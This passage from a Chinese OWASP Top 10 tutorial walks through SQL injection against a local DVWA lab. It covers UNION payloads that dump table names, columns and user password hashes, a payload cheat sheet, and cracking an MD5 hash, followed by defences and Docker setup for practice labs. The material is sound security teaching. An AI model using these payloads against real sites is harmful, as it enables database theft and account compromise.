    <version>2.17.1</version>  <!-- 或更高版本 -->
</dependency>
```

**2. 临时缓解**
```java
// 禁用 JNDI Lookup
System.setProperty("log4j2.formatMsgNoLookups", "true");

// 设置环境变量：LOG4J_FORMAT_MSG_NO_LOOKUPS=true
```

**3. 长期防护**
- 使用 **SBOM（软件物料清单）** 追踪依赖
- 定期使用 **OWASP Dependency Check** 扫描
- 建立组件更新策略
- 限制网络出站流量

---

### A05:2025 注入攻击

#### 5.1 漏洞原理

**类比**：你在餐厅点菜，服务员问你要什么，你说"来一份牛排，顺便把隔壁桌的账单算在我头上"。服务员不加验证就照做了。

**技术原理**：用户输入被直接拼接到 SQL 语句或命令中执行。

**常见类型**：
- SQL 注入
- NoSQL 注入
- 命令注入
- LDAP 注入
- XPath 注入

#### 5.2 SQL 注入详细复现

**步骤1：进入 DVWA SQL Injection 模块**

1. 访问 DVWA：http://localhost:8081
2. 登录：admin/password
3. 设置安全等级为 **Low**
4. 点击左侧菜单的 **SQL Injection**

**步骤2：理解正常查询**

1. 页面显示一个输入框：**User ID**
2. 输入：`1`
3. 点击"Submit"
4. 看到结果：
   ```
   ID: 1
   First name: admin
   Surname: admin
   ```
5. **SQL 语句（猜测）**：
   ```sql
   SELECT first_name, last_name FROM users WHERE user_id = '1'
   ```

**步骤3：测试是否存在注入**

1. 输入：`1'`（注意单引号）
2. 点击"Submit"
3. **看到错误信息**：
   ```
   You have an error in your SQL syntax; check the manual that
   corresponds to your MySQL server version for the right syntax
   to use near ''1''' at line 1
   ```
4. **结论**：存在 SQL 注入漏洞！

**步骤4：获取数据库版本**

1. 输入：
   ```
   1' UNION SELECT 1, version()--
   ```
2. 点击"Submit"
3. 看到版本号：
   ```
   First name: 1
   Surname: 10.4.27-MariaDB
   ```

**Payload 解释**：
- `'`：闭合前面的单引号
- `UNION SELECT 1, version()`：联合查询，查询版本号
- `--`：注释掉后面的 SQL 语句

**步骤5：获取数据库名**

1. 输入：
   ```
   1' UNION SELECT 1, database()--
   ```
2. 看到数据库名：`dvwa`

**步骤6：获取表名**

1. 输入：
   ```
   1' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database()--
   ```
2. 看到表列表，找到 `users` 表

**步骤7：获取列名**

1. 输入：
   ```
   1' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'--
   ```
2. 看到列名：user_id, first_name, last_name, user, password, ...

**步骤8：获取所有用户**

1. 输入：
   ```
   1' UNION SELECT user, password FROM users--
   ```
2. 看到所有用户名和密码哈希！

**步骤9：破解管理员密码**

1. 输入：
   ```
   1' UNION SELECT user, password FROM users WHERE user='admin'--
   ```
2. 看到管理员密码哈希：
   ```
   5f4dcc3b5aa765d61d8327deb882cf99
   ```
3. **破解密码**：
   ```bash
   # 使用在线工具或hashcat
   # MD5哈希，结果：password
   ```

#### 5.3 SQL 注入 Payload 速查表

| 类型 | Payload |
|------|---------|
| 判断注入 | `' OR '1'='1` |
| 获取版本 | `' UNION SELECT 1, version()--` |
| 获取数据库 | `' UNION SELECT 1, database()--` |
| 获取用户 | `' UNION SELECT user(), 2--` |
| 获取表 | `' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database()--` |
| 获取列 | `' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'--` |

#### 5.4 SQL 注入防御方法

**1. 使用参数化查询（预编译语句）**

```php
// ❌ 错误做法
$sql = "SELECT * FROM users WHERE id = '" . $_GET['id'] . "'";
$result = $conn->query($sql);

// ✅ 正确做法（PHP PDO）
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id');
$stmt->execute(['id' => $_GET['id']]);
$result = $stmt->fetchAll();
```

**2. 输入验证**

```php
// 验证ID必须是数字
if (!is_numeric($_GET['id'])) {
    die("Invalid input");
}

// 或使用白名单
$allowed_ids = [1, 2, 3];
if (!in_array($_GET['id'], $allowed_ids)) {
    die("Invalid input");
}
```

**3. 最小权限原则**

```sql
-- 不要使用root或管理员账号连接数据库
-- 创建专用数据库用户，只赋予必要权限
GRANT SELECT, INSERT ON dvwa.* TO 'webuser'@'localhost';
```

**4. 使用 ORM**

ORM 框架（如 Django ORM、Hibernate）会自动处理 SQL 注入：

```python
# Django ORM - 自动防止SQL注入
user = User.objects.get(id=user_id)
```

---

### 学习总结

#### OWASP Top 10 核心漏洞回顾

| 漏洞编号 | 漏洞名称 | 严重程度 | 学习重点 |
|---------|---------|---------|---------|
| A01 | 失效的访问控制 | 🔴 高 | 水平/垂直越权、IDOR |
| A02 | 安全配置错误 | 🔴 高 | 默认配置、敏感信息泄露 |
| A03 | 软件供应链故障 | 🔴 高 | 依赖管理、SBOM |
| A05 | 注入攻击 | 🔴 高 | SQL注入、命令注入、参数化查询 |

#### 学习建议

1. **理论结合实践**：先理解原理，再动手复现
2. **由浅入深**：从 Low 难度开始，逐步挑战 Medium/High
3. **对比学习**：对比不同漏洞类型和防护方法
4. **记录笔记**：记录每个漏洞的攻击和防御方法
5. **遵守法律**：仅在授权环境练习

---

### 下一步学习

完成基础漏洞复现后，可以继续：
- 使用 WebGoat 学习更详细的交互式课程
- 使用 OWASP Juice Shop 练习现代Web应用漏洞
- 使用 SQLi-Labs 专项训练 SQL 注入
- 访问 PortSwigger Academy 进行在线练习
- 学习 VulHub 的真实漏洞环境

祝你学习愉快！🎯

---

## 清理环境

当你完成学习或需要释放空间时：

### 停止所有靶场

```bash
# 停止所有容器
docker stop webgoat dvwa juice-shop sqli-labs

# 删除所有容器
docker rm webgoat dvwa juice-shop sqli-labs

# 验证清理
docker ps
```

### 清理镜像（释放磁盘空间）

```bash
# 查看镜像占用
docker system df

# 清理未使用的镜像
docker image prune -a

# 清理所有未使用的资源（包括容器、镜像、网络、构建缓存）
docker system prune -a --volumes
```

---

## 进阶配置

### 使用 Docker Compose（推荐）

创建 `docker-compose.yml` 文件：

```yaml
version: '3.8'

services:
  dvwa:
    image: vulnerables/web-dvwa
    container_name: dvwa
    ports:
      - "8081:80"
    restart: unless-stopped

  webgoat:
    image: webgoat/webgoat
    container_name: webgoat
    ports:
      - "127.0.0.1:8080:8080"
      - "127.0.0.1:9090:9090"
    restart: unless-stopped

  juice-shop:
    image: bkimminich/juice-shop
    container_name: juice-shop
    ports:
      - "8082:3000"
    restart: unless-stopped

  sqli-labs:
    image: acgpiano/sqli-labs
    container_name: sqli-labs
    ports:
      - "8083:80"
    restart: unless-stopped
```

**使用方法**：
```bash
# 启动所有服务
docker-compose up -d

# 停止所有服务
docker-compose down

# 查看日志
docker-compose logs -f

# 重启服务
docker-compose restart
```

---

## 资源链接

- **Docker 官方文档**：https://docs.docker.com/
- **DVWA 官方仓库**：https://github.com/digininja/DVWA
- **WebGoat 官方网站**：https://owasp.org/www-project-webgoat/
- **Juice Shop 官方网站**：https://owasp.org/www-project-juice-shop/
- **SQLi-Labs 官方仓库**：https://github.com/Audi-1/sqli-labs

---

## 总结

### 方案优势

- ✅ **快速上手**：5分钟完成环境搭建
- ✅ **资源节省**：相比虚拟机节省90%空间
- ✅ **易于管理**：一个命令启动/停止
- ✅ **灵活切换**：可同时运行多个靶场
- ✅ **跨平台**：Windows、Mac、Linux 都能使用

### 学习建议

1. **循序渐进**：从 DVWA 开始，逐步深入
2. **理论结合实践**：理解漏洞原理，多动手练习
3. **记录笔记**：记录每个漏洞的攻击方式和防御方法
4. **保持好奇心**：探索不同靶场和漏洞类型

### 下一步

- 完成本指南后，可以继续学习：
  - [OWASP Top 10 详细漏洞复现教程](./OWASP_Top_10_完整教程_整合版.md)
  - [PortSwigger Web Security Academy](https://portswigger.net/web-security)
  - VulHub 专业靶场环境

祝你学习愉快！🚀
